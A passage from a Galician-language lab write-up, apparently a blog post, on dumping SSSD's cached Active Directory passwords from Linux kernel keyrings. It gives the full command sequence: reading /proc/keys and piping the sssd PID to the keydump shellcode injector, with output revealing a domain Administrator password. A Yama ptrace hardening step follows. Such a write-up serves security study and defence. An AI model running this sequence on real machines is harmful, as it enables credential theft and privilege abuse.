+$ sudo cat /etc/sssd/sssd.conf
+
+[sssd]
+domains = dev.lab
+config_file_version = 2
+services = nss, pam
+
+[domain/dev.lab]
+default_shell = /bin/bash
+krb5_store_password_if_offline = True
+cache_credentials = True
+krb5_realm = DEV.LAB
+realmd_tags = manages-system joined-with-adcli 
+id_provider = ad
+fallback_homedir = /home/%u@%d
+ad_domain = dev.lab
+use_fully_qualified_names = True
+ldap_id_mapping = True
+access_provider = ad
+#+end_src
+
+No caso de que a opción ~krb5_store_password_if_offline~ non apareza ou estea
+posta a ~false~, modificaá e pona a ~true~. E reinicia o demo sssd.
+
+Cando teñas isto tes que desconectar a máquina GNU/Linux do Controlador de
+Dominio. Para isto podes simplemente apagar o Controlador de Dominio.
+
+Agora precisarás acceder á máquina con dúas contas á vez:
+
+- Unha conta de dominio que será a víctima
+- Unha conta privilexiada coma root, algunha con sudo ou calquera usuaria ca
+  capacidade ~CAP_SYS_PTRACE~, que será a atacante. Esta conta da igual se é
+  local ou de dominio.
+
+#+begin_quote
+Ten en conta que calquera conta de dominio que vaias a usar precisa haber
+iniciado sesión antes de desconectar o Controlador de Dominio para que as súas
+credenciais (realmente os seus hashes) queden cacheados na máquina GNU/Linux.
+#+end_quote
+
+Primeiro accedemos coa conta de dominio, a víctima, por ssh:
+#+begin_src 
+$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$ 
+#+end_src
+
+Non precisarás volver a usar esta conta, soamente manter a súa terminal
+conectada.
+
+Agora copia o binario de keydump á máquina obxetivo (con scp por
+exemplo). Antes precisarás compilalo nunha máquina de características similares
+(ou na máquina obxetivo directamente) para evitar problemas de versións coa libc.
+
+Entón, noutra terminal, accede usando a conta privilexiada, a atacante:
+#+begin_src 
+$ ssh lab-debian 
+user@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jul 29 16:46:29 2024 from 192.168.122.254
+user@debian:~$ 
+#+end_src
+
+Como atacantes, podemos confirmar que a conta de dominio iniciou sesión co
+comando ~who~:
+#+begin_src 
+user@debian:~$ who
+user     pts/0        Jul 28 17:04 (192.168.122.254)
+administrator@dev.lab pts/1        Jul 28 16:46 (192.168.122.254)
+#+end_src
+
+E verificar que a chave que contén o contrasinal da víctima foi creada:
+#+begin_src 
+user@debian:~$ sudo cat /proc/keys | grep dev.lab
+10bfb037 I--Q---     1 perm 3f010000     0     0 user      Administrator@dev.lab: 10
+#+end_src
+
+Como podemos apreciar, unha chave foi creada co nome da conta víctima para
+almacenar o seu contrasinal, pero nos non temos permisos para leela, so os
+procesos posuidores poden. Podemos verificar isto co comando ~keyctl~ (que
+ten que ser instalado):
+
+#+begin_src 
+user@debian:~$ sudo keyctl read 0x10bfb037
+keyctl_read_alloc: Permission denied
+#+end_src
+
+Afortunadamente, podemos usar keydump para volcar as chaves do proceso sssd
+pasándolle o seu pid:
+#+begin_src 
+user@debian:~$ ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+user@debian:~$ sudo cat /tmp/k_452/10bfb037_user_Administrator_dev_lab__10
+S3cur3p4ss
+#+end_src
+
+Éxito!! Fomos quen de leer as chaves de ssh e obter o contrasinal da víctima.
+
+* Prevención
+:PROPERTIES:
+:custom_id: prevencion
+:END:
+
+Para previr este ataque non debemos permitir aos procesos acoplarse a outros, o
+que pode facerse co seguinte comando:
+
+#+begin_src 
+echo 3 | sudo tee /proc/sys/kernel/yama/ptrace_scope
+#+end_src
+
+Isto configura o módulo de seguridade [[https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html][Yama]] para bloquear accesos a ptrace (o que
+tamén evita que se poida acceder a ficheiros coma =/proc/<pid>/mem= e
+=/proc/<pid>/maps=). Penso que tamén debería ser posible bloquear este
+ataque con SELinux ou Apparmor, pero non sei como se fai.
+
+* Conclusión
+:PROPERTIES:
+:custom_id: conclusion
+:END:
+
+Neste artigo mostrei como garda SSSD as passwords cando o Controlador de Dominio
+non está dispoñible, como funcionan os keyrings e como podemos leer as chaves de
+outros procesos con keydump. Agardo que che gustase e lle podas atopar
+utilidade.
+
+Bo hacking e viva Palestina ceibe!!
+
+
+* Referencias
+:PROPERTIES:
+:custom_id: referencias
+:END:
+
+[fn:keydump] Eloy Pérez González. "keydump". Github. 14 July, 2024,
+https://github.com/zer1t0/keydump
+
+[fn:linux-process-injection] Fob. "Process Injection on Linux - Injecting into Processes". fob's
+notebook, 31 May, 2022, https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/
+
+[fn:linux-syscall-calling-convention] claws. "What are the calling conventions
+for UNIX & Linux system calls (and user-space functions) on i386 and
+x86-64". Stack Overflow. 18 January, 2024, https://stackoverflow.com/a/2538212 
+
+[fn:shellnova] Eloy Pérez González. "shellnova". Github. 14 July, 2024,
+https://github.com/zer1t0/shellnova 
+
